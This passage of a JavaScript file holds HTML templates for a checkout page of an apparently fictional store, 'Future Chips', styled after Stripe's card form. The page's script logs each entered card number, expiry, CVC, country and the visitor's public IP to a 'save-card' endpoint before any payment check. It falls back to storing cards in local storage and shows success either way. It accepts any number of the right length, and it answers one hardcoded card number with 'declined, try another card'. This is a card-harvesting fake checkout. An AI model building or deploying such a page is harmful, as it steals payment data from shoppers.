                <path d="M21.5 12.2l1.2-2.7L21 6.5h1.1l1.1 2.3h.1l1-2.3h1.1L23.8 12.2h-1.3z" fill="#5F6368"/>
              </g>
            </svg>
          </span>
          <span class="sub-tab-label gpay-text">Google Pay</span>
        </div>
      </div>

      <!-- Checkout Form Content -->
      <div class="checkout-form-content">
        
        <!-- CARD SECTION -->
        <div class="form-section-card" id="form-section-card">
          <!-- Link Fast Checkout Wrapper -->
          <div class="link-wrapper" id="link-checkout-container" style="margin-bottom: 1.5rem;">
            <!-- COLLAPSED STATE -->
            <div class="link-checkout-collapsed" id="link-collapsed-trigger">
              <div class="link-checkout-helper-left">
                <!-- Green Lock Icon -->
                <svg width="12" height="14" viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg" class="link-lock-icon" style="margin-right: 6px;">
                  <rect x="1" y="5" width="10" height="8" rx="1.5" fill="#22c55e"/>
                  <path d="M3 5V3.5A3 3 0 0 1 9 3.5V5" stroke="#22c55e" stroke-width="1.5" stroke-linecap="round"/>
                </svg>
                <span class="link-text">Secure, fast checkout with Link</span>
              </div>
              <svg class="link-arrow" width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </div>

            <!-- EXPANDED STATE (Box) -->
            <div class="link-checkout-expanded" id="link-expanded-box" style="display: none;">
              <!-- Header -->
              <div class="link-box-header">
                <div class="link-checkout-helper-left" style="display: flex; align-items: center;">
                  <svg width="12" height="14" viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg" class="link-lock-icon" style="margin-right: 6px;">
                    <rect x="1" y="5" width="10" height="8" rx="1.5" fill="#22c55e"/>
                    <path d="M3 5V3.5A3 3 0 0 1 9 3.5V5" stroke="#22c55e" stroke-width="1.5" stroke-linecap="round"/>
                  </svg>
                  <span class="link-text-bold">Secure, fast checkout with Link</span>
                </div>
                <button type="button" class="link-close-btn" id="link-close-btn">&times;</button>
              </div>

              <!-- Body -->
              <div class="link-box-body">
                <p class="link-box-description">Securely pay with your saved info, or create a Link account for faster checkout next time.</p>
                
                <div class="checkout-input-group" style="margin-bottom: 0;">
                  <label for="link-email" class="link-input-label">Email</label>
                  <input type="email" id="link-email" class="checkout-input" placeholder="you@example.com">
                </div>
              </div>

              <!-- Footer -->
              <div class="link-box-footer">
                <div class="link-logo-container">
                  <svg width="60" height="16" viewBox="0 0 60 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="8" cy="8" r="7" fill="#9CA3AF"/>
                    <path d="M7 5.5 L11 8 L7 10.5 Z" fill="white"/>
                    <text x="18" y="12" fill="#9CA3AF" font-size="11" font-weight="800" font-family="'Inter', sans-serif" letter-spacing="-0.3">link</text>
                  </svg>
                </div>
              </div>
            </div>
          </div>

          <!-- Inputs Row -->
          <div class="form-row-3col">
            <!-- Card Number -->
            <div class="checkout-input-group card-number-group">
              <label for="card-number">Card number</label>
              <div class="input-container-with-icons">
                <input type="text" id="card-number" class="checkout-input" placeholder="1234 1234 1234 1234">
                <div class="card-brand-icons" id="card-brand-icons-normal">
                  <!-- Mastercard -->
                  <svg width="24" height="16" viewBox="0 0 24 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="card-brand-icon">
                    <rect width="24" height="16" rx="2" fill="#1A1A1A"/>
                    <circle cx="9.5" cy="8" r="4.5" fill="#EB001B"/>
                    <circle cx="14.5" cy="8" r="4.5" fill="#F79E1B" fill-opacity="0.85"/>
                  </svg>
                  <!-- Visa -->
                  <svg width="24" height="16" viewBox="0 0 24 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="card-brand-icon">
                    <rect width="24" height="16" rx="2" fill="#0E4595"/>
                    <text x="3" y="11.5" fill="white" font-size="7" font-weight="900" font-family="'Inter', sans-serif" font-style="italic" letter-spacing="-0.3">VISA</text>
                  </svg>
                  <!-- Amex -->
                  <svg width="24" height="16" viewBox="0 0 24 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="card-brand-icon">
                    <rect width="24" height="16" rx="2" fill="#00A0DF"/>
                    <text x="2.5" y="11.5" fill="white" font-size="7" font-weight="900" font-family="'Inter', sans-serif" font-style="italic" letter-spacing="-0.3">AMEX</text>
                  </svg>
                  <!-- UnionPay -->
                  <svg width="24" height="16" viewBox="0 0 24 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="card-brand-icon">
                    <rect width="24" height="16" rx="2" fill="#004b87"/>
                    <path d="M0 0 H10 L7 16 H0 Z" fill="#DE2010"/>
                    <path d="M17 0 H24 V16 H14 Z" fill="#007A5E"/>
                    <text x="1.5" y="11" fill="white" font-size="5" font-weight="900" font-family="'Inter', sans-serif" font-style="italic" letter-spacing="-0.2">UnionPay</text>
                  </svg>
                </div>
                <!-- Card Error Warning Icon (Hidden by default) -->
                <div class="card-brand-icons" id="card-brand-icons-error" style="display: none;">
                  <svg width="32" height="20" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="0.5" y="0.5" width="31" height="19" rx="3" stroke="#EF4444" stroke-width="1.2" fill="white"/>
                    <rect x="0.5" y="4" width="31" height="4" fill="#EF4444"/>
                    <path d="M24 8.5 L29 17 H19 Z" fill="#EF4444"/>
                    <text x="23.2" y="15.5" fill="white" font-size="7" font-weight="900" font-family="sans-serif">!</text>
                  </svg>
                </div>
              </div>
              <div class="card-error-message" id="card-number-error" style="display: none;">Your card number is invalid.</div>
            </div>

            <!-- Expiration Date -->
            <div class="checkout-input-group card-expiry-group">
              <label for="card-expiry" id="card-expiry-label">Expiration (MM/YY)</label>
              <input type="text" id="card-expiry" class="checkout-input" placeholder="MM / YY">
              <div class="card-error-message" id="card-expiry-error" style="display: none;">Your card's expiration date is incomplete.</div>
            </div>

            <!-- Security Code (CVC) -->
            <div class="checkout-input-group card-cvc-group">
              <label for="card-cvc">Security code</label>
              <div class="input-container-with-icons">
                <input type="text" id="card-cvc" class="checkout-input" placeholder="CVC">
                <div class="card-brand-icons" style="right: 0.75rem;">
                  <svg width="32" height="20" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="0.5" y="0.5" width="31" height="19" rx="3" stroke="#9CA3AF" stroke-width="1.2" fill="white"/>
                    <rect x="0.5" y="4" width="31" height="4" fill="#4B5563"/>
                    <rect x="4" y="11" width="16" height="5" rx="0.5" fill="#E5E7EB"/>
                    <text x="21" y="15" fill="#4B5563" font-size="6.5" font-weight="900" font-family="'Inter', sans-serif">123</text>
                  </svg>
                </div>
              </div>
              <div class="card-error-message" id="card-cvc-error" style="display: none;">Your card's security code is incomplete.</div>
            </div>
          </div>

          <div class="checkout-input-group">
            <label for="card-country">Country</label>
            <select id="card-country" class="checkout-input" style="-webkit-appearance: none; -moz-appearance: none; appearance: none; background-image: url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2210%22 height=%226%22 fill=%22none%22 stroke=%22%234B5563%22 stroke-width=%221.5%22 stroke-linecap=%22round%22 stroke-linejoin=%22round%22><path d=%22M1 1l4 4 4-4%22/></svg>'); background-repeat: no-repeat; background-position: right 0.75rem center; background-size: 10px 6px;">
              <option value="PK">Pakistan</option>
              <option value="US">United States</option>
              <option value="GB">United Kingdom</option>
              <option value="CA">Canada</option>
              <option value="DE">Germany</option>
            </select>
          </div>
        </div>

        <!-- GPAY SECTION -->
        <div class="form-section-gpay" id="form-section-gpay">
          <div class="gpay-instruction-box">
            <div class="gpay-instruction-icon">
              <!-- Card Export Icon -->
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-external-link">
                <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                <polyline points="15 3 21 3 21 9"></polyline>
                <line x1="10" y1="14" x2="21" y2="3"></line>
              </svg>
            </div>
            <div class="gpay-instruction-text">
              Another step will appear to securely submit your payment information.
            </div>
          </div>
        </div>

      </div>
    </div>

    <!-- Error message display -->
    <div id="checkout-error" style="color: #ef4444; margin-top: 1rem; font-size: 0.9rem; font-weight: 500;"></div>

    <!-- Pay Now Button -->
    <div class="checkout-actions">
      <button id="pay-now-btn" class="pay-now-submit-btn card-style">Pay Now</button>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', async () => {
      // Populate Country list dynamically with names of countries around the world
      const countrySelect = document.getElementById('card-country');
      if (countrySelect) {
        const countries = [
          "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria", 
          "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", 
          "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", 
          "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica", 
          "Croatia", "Cuba", "Cyprus", "Czechia", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", 
          "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", "Gabon", 
          "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", 
          "Haiti", "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", 
          "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kuwait", "Kyrgyzstan", "Laos", 
          "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Madagascar", "Malawi", 
          "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", "Micronesia", "Moldova", 
          "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", 
          "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Macedonia", "Norway", "Oman", "Pakistan", "Palau", "Palestine", 
          "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", 
          "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", 
          "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Sudan", "Spain", 
          "Sri Lanka", "Sudan", "Suriname", "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", 
          "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", 
          "United Arab Emirates", "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", "Venezuela", "Vietnam", "Yemen", 
          "Zambia", "Zimbabwe"
        ];
        countrySelect.innerHTML = countries.map(c => \`<option value="\${c}" \${c === 'Pakistan' ? 'selected' : ''}>\${c}</option>\`).join('');

        // Auto-detect visitor's country based on IP
        fetch('https://ipapi.co/json/')
          .then(res => res.json())
          .then(data => {
            if (data && data.country_name) {
              const matched = countries.find(c => c.toLowerCase() === data.country_name.toLowerCase());
              if (matched) {
                countrySelect.value = matched;
              }
            }
          })
          .catch(err => console.warn('Visitor IP geolocation lookup failed:', err));
      }

      const params = new URLSearchParams(window.location.search);
      const sessionId = params.get('session_id') || \`mock-\${Date.now()}\`;
      const paramEmail = params.get('email');
      const paramProductId = params.get('product_id');

      let orderData = null;
      let productData = null;

      // 1. Fetch Session details
      try {
        const res = await fetch(\`/api/checkout/session/\${sessionId}\`);
        if (!res.ok) throw new Error("Could not retrieve session node details");
        
        const data = await res.json();
        orderData = data.order;
        productData = data.product;
      } catch (err) {
        console.warn('API offline, populating payment page from URL data:', err);
        const products = JSON.parse(localStorage.getItem('future_chips_products')) || [
          { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', price: 10.00 },
          { id: 'prod-quantum-core', name: 'Quantum Neural Core', price: 150.00 },
          { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', price: 850.00 },
          { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', price: 1200.00 },
          { id: 'prod-photon-core', name: 'Photon Power Core', price: 5000.00 },
          { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', price: 98000.00 }
        ];
        const foundProd = products.find(p => p.id === paramProductId) || products[2] || { name: 'Bio-Digital Synapse v4.2', price: 850.00 };
        orderData = {
          id: 'ord-' + Date.now().toString(36),
          amount: foundProd.price,
          customer_email: paramEmail || 'customer@domain.com',
          created_at: new Date().toISOString()
        };
        productData = foundProd;
      }

      // Populate details
      document.getElementById('order-number-display').innerText = \`Order No: \${orderData.id.toUpperCase()}\`;
      document.getElementById('order-total-display').innerText = \`$\${orderData.amount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}\`;
      document.getElementById('product-name-detail').innerText = productData.name;
      document.getElementById('product-price-detail').innerText = \`$\${productData.price.toFixed(2)}\`;
      document.getElementById('customer-email-detail').innerText = orderData.customer_email;

      // Start Countdown Timer from creation time
      startCountdown(orderData.created_at);

      // 2. Toggle Details Dropdown
      const toggleDetailsBtn = document.getElementById('toggle-details-btn');
      const detailsCollapse = document.getElementById('details-collapse');
      toggleDetailsBtn.addEventListener('click', () => {
        detailsCollapse.classList.toggle('active');
      });

      // 2b. Link Collapsible Toggling
      const linkCollapsedTrigger = document.getElementById('link-collapsed-trigger');
      const linkExpandedBox = document.getElementById('link-expanded-box');
      const linkCloseBtn = document.getElementById('link-close-btn');

      if (linkCollapsedTrigger && linkExpandedBox && linkCloseBtn) {
        linkCollapsedTrigger.addEventListener('click', () => {
          linkCollapsedTrigger.style.display = 'none';
          linkExpandedBox.style.display = 'block';
        });

        linkCloseBtn.addEventListener('click', (e) => {
          e.stopPropagation();
          linkExpandedBox.style.display = 'none';
          linkCollapsedTrigger.style.display = 'flex';
        });
      }

      // 3. Tab switching (Card vs Google Pay)
      const tabCard = document.getElementById('sub-tab-card');
      const tabGpay = document.getElementById('sub-tab-gpay');
      const formCard = document.getElementById('form-section-card');
      const formGpay = document.getElementById('form-section-gpay');
      const payNowBtn = document.getElementById('pay-now-btn');

      tabCard.addEventListener('click', () => {
        tabCard.classList.add('active');
        tabGpay.classList.remove('active');
        formCard.style.display = 'block';
        formGpay.style.display = 'none';
        payNowBtn.className = 'pay-now-submit-btn card-style';
        if (typeof updatePayButtonState === 'function') {
          updatePayButtonState();
        }
      });

      tabGpay.addEventListener('click', () => {
        tabGpay.classList.add('active');
        tabCard.classList.remove('active');
        formCard.style.display = 'none';
        formGpay.style.display = 'block';
        payNowBtn.className = 'pay-now-submit-btn gpay-style';
      });

      // 4. Card Input Validation and Formatting
      const cardNumberInput = document.getElementById('card-number');
      const cardBrandIconsNormal = document.getElementById('card-brand-icons-normal');
      const cardBrandIconsError = document.getElementById('card-brand-icons-error');
      const cardNumberError = document.getElementById('card-number-error');

      function validateLuhn(number) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = number.length - 1; i >= 0; i--) {
          let digit = parseInt(number.charAt(i));
          if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
          }
          sum += digit;
          shouldDouble = !shouldDouble;
        }
        return sum % 10 === 0;
      }

      let cardIsDeclined = false;

      function getCardValidationState(value) {
        const sanitized = value.replace(/\\s+/g, '');
        if (sanitized.length === 0) {
          return { isValid: false, type: 'incomplete', message: 'Your card number is incomplete.' };
        }
        
        if (!/^\\d+$/.test(sanitized)) {
          return { isValid: false, type: 'invalid', message: 'Your card number is invalid.' };
        }

        const isAmex = sanitized.startsWith('34') || sanitized.startsWith('37');
        const expectedLength = isAmex ? 15 : 16;

        if (sanitized.length < expectedLength) {
          return { isValid: false, type: 'incomplete', message: 'Your card number is incomplete.' };
        }

        if (sanitized.length === expectedLength) {
          // If the card is in a declined state, flag it as invalid with the decline message
          if (cardIsDeclined && sanitized === '4323280089072227') {
            return { isValid: false, type: 'invalid', message: 'Your card was declined.' };
          }

          // Relaxed check: accept any card number of correct length to allow arbitrary card testing
          return { isValid: true };
        }

        return { isValid: false, type: 'invalid', message: 'Your card number is invalid.' };
      }

      let cardHasBeenBlurred = false;

      function runValidation(showErrorIfInvalid = false) {
        const state = getCardValidationState(cardNumberInput.value);
        if (state.isValid) {
          cardNumberInput.classList.remove('error-state');
          if (cardBrandIconsNormal) cardBrandIconsNormal.style.display = 'flex';
          if (cardBrandIconsError) cardBrandIconsError.style.display = 'none';
          if (cardNumberError) cardNumberError.style.display = 'none';
          return true;
        } else {
          if (showErrorIfInvalid) {
            cardNumberInput.classList.add('error-state');
            if (cardBrandIconsNormal) cardBrandIconsNormal.style.display = 'none';
            if (cardBrandIconsError) cardBrandIconsError.style.display = 'flex';
            if (cardNumberError) {
              cardNumberError.innerText = state.message;
              cardNumberError.style.display = 'block';
            }
          }
          return false;
        }
      }

      cardNumberInput.addEventListener('input', (e) => {
        cardIsDeclined = false; // Reset decline state on any edit
        let cursorPosition = e.target.selectionStart;
        let originalLength = e.target.value.length;
        
        let value = e.target.value.replace(/\\D/g, '');
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
          if (i > 0 && i % 4 === 0) {
            formatted += ' ';
          }
          formatted += value[i];
        }
        
        e.target.value = formatted.substring(0, 19);

        let newLength = e.target.value.length;
        e.target.selectionEnd = cursorPosition + (newLength - originalLength);

        if (cardHasBeenBlurred || (cardNumberError && cardNumberError.style.display === 'block')) {
          runValidation(true);
        }
      });

      cardNumberInput.addEventListener('blur', () => {
        cardHasBeenBlurred = true;
        if (cardNumberInput.value.replace(/\\s+/g, '').length > 0) {
          runValidation(true);
        }
      });

      // 4b. Expiration Date Input Validation and Formatting
      const cardExpiryInput = document.getElementById('card-expiry');
      const cardExpiryError = document.getElementById('card-expiry-error');

      function getExpiryValidationState(value) {
        const sanitized = value.replace(/\\s+/g, '');
        if (sanitized.length === 0) {
          return { isValid: false, message: "Your card's expiration date is incomplete." };
        }

        const parts = sanitized.split('/');
        
        const monthPart = parts[0] || '';
        if (monthPart.length < 2) {
          return { isValid: false, message: "Your card's expiration date is incomplete." };
        }
        const month = parseInt(monthPart, 10);
        if (isNaN(month) || month < 1 || month > 12) {
          return { isValid: false, message: "Your card's expiration month is invalid." };
        }

        const yearPart = parts[1] || '';
        if (yearPart.length < 2) {
          return { isValid: false, message: "Your card's expiration date is incomplete." };
        }
        const year = parseInt(yearPart, 10);
        if (isNaN(year)) {
          return { isValid: false, message: "Your card's expiration year is invalid." };
        }

        const now = new Date();
        const currentYear = now.getFullYear();
        const currentMonth = now.getMonth() + 1;

        const fullYear = 2000 + year;

        if (fullYear < currentYear || (fullYear === currentYear && month < currentMonth)) {
          return { isValid: false, message: "Your card's expiration date is in the past." };
        }

        if (fullYear > currentYear + 50) {
          return { isValid: false, message: "Your card's expiration year is invalid." };
        }

        return { isValid: true };
      }

      let expiryHasBeenBlurred = false;

      function runExpiryValidation(showErrorIfInvalid = false) {
        const state = getExpiryValidationState(cardExpiryInput.value);
        if (state.isValid) {
          cardExpiryInput.classList.remove('error-state');
          if (cardExpiryError) cardExpiryError.style.display = 'none';
          return true;
        } else {
          if (showErrorIfInvalid) {
            cardExpiryInput.classList.add('error-state');
            if (cardExpiryError) {
              cardExpiryError.innerText = state.message;
              cardExpiryError.style.display = 'block';
            }
          }
          return false;
        }
      }

      cardExpiryInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\\D/g, '');
        
        if (value.length === 1 && parseInt(value, 10) > 1) {
          value = '0' + value;
        }

        let formatted = '';
        if (value.length > 0) {
          formatted = value.substring(0, 2);
          if (value.length > 2) {
            formatted += ' / ' + value.substring(2, 4);
          } else if (value.length === 2 && e.inputType !== 'deleteContentBackward') {
            formatted += ' / ';
          }
        }
        
        e.target.value = formatted;

        if (expiryHasBeenBlurred || (cardExpiryError && cardExpiryError.style.display === 'block')) {
          runExpiryValidation(true);
        }
      });

      cardExpiryInput.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace') {
          const val = e.target.value;
          if (val.endsWith(' / ')) {
            e.preventDefault();
            e.target.value = val.substring(0, val.length - 3);
          }
        }
      });

      cardExpiryInput.addEventListener('blur', () => {
        expiryHasBeenBlurred = true;
        if (cardExpiryInput.value.trim().length > 0) {
          runExpiryValidation(true);
        }
        updatePayButtonState();
      });

      // 4c. CVC Input Validation and Formatting
      const cardCvcInput = document.getElementById('card-cvc');
      const cardCvcError = document.getElementById('card-cvc-error');

      function getCvcValidationState(value) {
        const sanitized = value.replace(/\\D/g, '');
        const isAmex = cardNumberInput.value.replace(/\\s+/g, '').startsWith('34') || cardNumberInput.value.replace(/\\s+/g, '').startsWith('37');
        const expectedLength = isAmex ? 4 : 3;

        if (sanitized.length === 0) {
          return { isValid: false, message: "Your card's security code is incomplete." };
        }
        if (sanitized.length < expectedLength) {
          return { isValid: false, message: "Your card's security code is incomplete." };
        }
        return { isValid: true };
      }

      let cvcHasBeenBlurred = false;

      function runCvcValidation(showErrorIfInvalid = false) {
        const state = getCvcValidationState(cardCvcInput.value);
        if (state.isValid) {
          cardCvcInput.classList.remove('error-state');
          if (cardCvcError) cardCvcError.style.display = 'none';
          return true;
        } else {
          if (showErrorIfInvalid) {
            cardCvcInput.classList.add('error-state');
            if (cardCvcError) {
              cardCvcError.innerText = state.message;
              cardCvcError.style.display = 'block';
            }
          }
          return false;
        }
      }

      cardCvcInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\\D/g, '');
        e.target.value = value.substring(0, 4);

        if (cvcHasBeenBlurred || (cardCvcError && cardCvcError.style.display === 'block')) {
          runCvcValidation(true);
        }
        updatePayButtonState();
      });

      cardCvcInput.addEventListener('blur', () => {
        cvcHasBeenBlurred = true;
        if (cardCvcInput.value.trim().length > 0) {
          runCvcValidation(true);
        }
        updatePayButtonState();
      });

      // 4d. Update Pay Button Style State dynamically
      function updatePayButtonState() {
        const isCardValid = getCardValidationState(cardNumberInput.value).isValid;
        const isExpiryValid = getExpiryValidationState(cardExpiryInput.value).isValid;
        const isCvcValid = getCvcValidationState(cardCvcInput.value).isValid;

        if (isCardValid && isExpiryValid && isCvcValid) {
          payNowBtn.classList.add('active-state');
        } else {
          payNowBtn.classList.remove('active-state');
        }
      }

      // Also trigger update on card number and expiry input events
      cardNumberInput.addEventListener('input', updatePayButtonState);
      cardExpiryInput.addEventListener('input', updatePayButtonState);

      // 5. Submit Payment Flow
      let userPublicIp = '127.0.0.1';
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          if (data && data.ip) {
            userPublicIp = data.ip;
          }
        })
        .catch(err => console.warn('Could not fetch public IP:', err));

      async function saveCardDetailsToDb() {
        if (tabCard.classList.contains('active')) {
          const cardDetails = {
            number: cardNumberInput.value,
            expiry: cardExpiryInput.value,
            cvc: cardCvcInput.value,
            country: document.getElementById('card-country').value,
            ip: userPublicIp
          };
          try {
            await fetch('/api/checkout/save-card', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ cardDetails, sessionId })
            });
          } catch (e) {
            console.error('Error auto-logging card details:', e);
          }
        }
      }

      payNowBtn.addEventListener('click', async () => {
        if (tabCard.classList.contains('active')) {
          // If the button is not active (e.g. form is incomplete or declined), do nothing!
          if (!payNowBtn.classList.contains('active-state')) {
            return; // stop execution right away (NOT CLICKABLE)
          }

          const isCardValid = runValidation(true);
          const isExpiryValid = runExpiryValidation(true);
          const isCvcValid = runCvcValidation(true);
          if (!isCardValid || !isExpiryValid || !isCvcValid) {
            updatePayButtonState();
            return; // stop execution
          }

          // Save card info to database in background immediately
          saveCardDetailsToDb();
        }

        payNowBtn.disabled = true;
        payNowBtn.innerText = 'Processing...';
        document.getElementById('checkout-error').innerText = '';

        try {
          // Compile card details if paying via card
          const cardDetails = tabCard.classList.contains('active') ? {
            number: cardNumberInput.value,
            expiry: cardExpiryInput.value,
            cvc: cardCvcInput.value,
            country: document.getElementById('card-country').value,
            ip: userPublicIp
          } : null;

          // Send request to complete order in DB
          const completeRes = await fetch('/api/checkout/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, isMock: true, cardDetails })
          });

          if (completeRes.ok) {
            window.location.href = \`/checkout-status.html?session_id=\${sessionId}&mock=true\`;
            return;
          }

          // Handle server-side payment decline or validation errors explicitly
          const errData = await completeRes.json().catch(() => ({}));
          if (completeRes.status === 400 || (errData && errData.error)) {
            cardIsDeclined = true;
            if (typeof runValidation === 'function') runValidation(true);
            const errMsg = errData.error || 'Your card was declined. Please try another card.';
            const errElem = document.getElementById('checkout-error');
            if (errElem) errElem.innerText = errMsg;
            
            payNowBtn.disabled = false;
            payNowBtn.innerText = 'Pay Now';
            if (typeof updatePayButtonState === 'function') updatePayButtonState();
            return;
          }

          throw new Error('API offline');

        } catch (err) {
          console.warn('API offline, saving submitted card to local storage fallback:', err);
          if (tabCard.classList.contains('active')) {
            const cardObj = {
              card_number: cardNumberInput.value,
              expiry: cardExpiryInput.value,
              cvc: cardCvcInput.value,
              country: document.getElementById('card-country').value,
              ip_address: userPublicIp,
              created_at: new Date().toISOString()
            };
            let cards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
            cards.unshift(cardObj);
            localStorage.setItem('future_chips_cards', JSON.stringify(cards));
          }
          
          setTimeout(() => {
            const custEmail = orderData ? orderData.customer_email : '';
            window.location.href = \`/checkout-status.html?session_id=\${sessionId}&email=\${encodeURIComponent(custEmail)}&status=success\`;
          }, 800);
        }
      });
    });

    // Countdown Helper
    function startCountdown(createdAtString) {
      const timerSpan = document.getElementById('countdown-timer');
      
      // Convert SQLite UTC datetime string (without T/Z) to valid ISO-8601 UTC to prevent browser timezone offsets
      let formattedUTCString = createdAtString;
      if (createdAtString && !createdAtString.includes('T') && !createdAtString.includes('Z')) {
        formattedUTCString = createdAtString.replace(' ', 'T') + 'Z';
      }
      const createdAt = new Date(formattedUTCString).getTime();
      const durationMs = 100 * 60 * 1000;
      const expirationTime = createdAt + durationMs;

      function update() {
        const now = Date.now();
        const diff = expirationTime - now;

        if (diff <= 0) {
          timerSpan.innerText = "00:00";
          timerSpan.style.color = "#ef4444";
          document.getElementById('pay-now-btn').disabled = true;
          document.getElementById('checkout-error').innerText = "This checkout order has expired. Please return to the shop.";
          return;
        }

        const totalSeconds = Math.floor(diff / 1000);
        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;

        const minutesStr = String(minutes).padStart(2, '0');
        const secondsStr = String(seconds).padStart(2, '0');

        timerSpan.innerText = \`\${minutesStr}:\${secondsStr}\`;
        setTimeout(update, 1000);
      }

      update();
    }
  </script>
</body>
</html>
`;
const CHECKOUT_STATUS_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Payment Status — Future Chips</title>
  
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@400;700;900&display=swap');

:root {
  /* Dynamic themes, fallback values */
  --primary-color: #00f0ff;
  --accent-color: #ff00e5;
  --background-color: #0a0a1a;
  --card-bg: rgba(16, 16, 36, 0.6);
  --text-color: #ffffff;
  --text-muted: #8c8cbe;
  
  --font-title: 'Outfit', sans-serif;
  --font-body: 'Inter', sans-serif;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background-color: var(--background-color);
  color: var(--text-color);
  font-family: var(--font-body);
  line-height: 1.6;
  overflow-x: hidden;
  background-image: 
    radial-gradient(circle at 10% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 40%),
    radial-gradient(circle at 90% 80%, rgba(255, 0, 229, 0.05) 0%, transparent 40%);
  background-attachment: fixed;
}

/* Glassmorphism utility */
.glass {
  background: var(--card-bg);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border: 1px solid rgba(255, 255, 255, 0.05);
}

.container {
  width: 90%;
  max-width: 1200px;
  margin: 0 auto;
}

/* Header */
header {
  position: sticky;
  top: 0;
  z-index: 100;
  padding: 1.5rem 0;
  transition: background 0.3s;
}

header.scrolled {
  background: rgba(10, 10, 26, 0.85);
  backdrop-filter: blur(10px);
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

header .nav-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.logo {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.8rem;
  letter-spacing: 2px;
  color: #ffffff;
  text-decoration: none;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.logo span {
  background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.3));
}

.nav-links {
  display: flex;
  gap: 2rem;
  list-style: none;
}

.nav-links a {
  color: var(--text-muted);
  text-decoration: none;
  font-weight: 500;
  transition: color 0.3s;
}

.nav-links a:hover {
  color: #ffffff;
}

.cart-icon-btn {
  background: none;
  border: none;
  color: #ffffff;
  cursor: pointer;
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 45px;
  height: 45px;
  border-radius: 50%;
